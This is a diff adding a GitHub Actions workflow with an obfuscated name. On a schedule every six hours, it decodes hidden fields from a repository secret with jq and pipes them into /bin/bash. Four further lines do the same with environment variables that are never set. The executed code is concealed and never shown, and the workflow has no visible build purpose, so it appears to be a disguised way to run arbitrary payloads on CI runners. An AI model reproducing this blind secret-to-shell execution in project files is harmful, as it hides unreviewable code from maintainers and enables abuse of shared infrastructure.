@@ -1,0 +1,21 @@
+name: dangjidaduxiaonvren
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dangjidaduxiaonvren
+        env:
+          wh40951: ${{ secrets.wh40951 }}
+        run: |
+          echo $wh40951 | jq -r .n64 | /bin/bash
+          echo $p13 | jq -r .atsar64 | /bin/bash
+          echo $t41504 | jq -r .x8254 | /bin/bash
+          echo $xkb73 | jq -r .ewn70394 | /bin/bash
+          echo $djfqa6 | jq -r .bx90018 | /bin/bash
+
